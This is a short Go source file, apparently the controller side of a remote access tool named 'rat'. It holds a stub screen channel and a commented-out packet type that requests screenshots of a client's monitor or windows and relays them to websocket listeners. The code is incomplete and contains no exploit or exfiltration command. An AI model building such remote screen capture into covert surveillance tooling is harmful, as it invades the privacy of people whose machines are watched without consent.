package main

import (
	"fmt"
	"io"
	"rat/shared/network/header"
)

type ScreenChannel struct {
	controller *Controller
}

func (ScreenChannel) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (sc ScreenChannel) Open(r io.ReadWriteCloser, c *Client) error {
	defer r.Close()

	listener := sc.controller.Listen(ScreenEvent, c)
	defer listener.Unlisten()

	fmt.Println("channel open")

	return nil
}

/*
type ScreenPacket struct {
	Active bool    `network:"send"`
	Scale  float32 `network:"send"`

	// Monitor is true if this is a whole screenshot, or a single window
	Monitor bool `network:"send"`

	// Handle to monitor or window
	Handle int `network:"send"`

	Buffer []byte `network:"receive"`

	//incoming
	Width  int
	Height int
}

func (packet ScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (packet ScreenPacket) Init(c *Client) {

}

func (packet ScreenPacket) OnReceive(c *Client) error {
	fmt.Println("packet recv, buf bytes", len(packet.Buffer))

	if ws, ok := c.Listeners[header.ScreenHeader]; ok {
		err := sendMessage(ws, c, ScreenFrameMessage{
			Buffer: packet.Buffer,
			Width:  packet.Width,
			Height: packet.Height,
		})

		if err != nil {
			return err
		}
	}
	return nil
}

func (packet ScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
*/
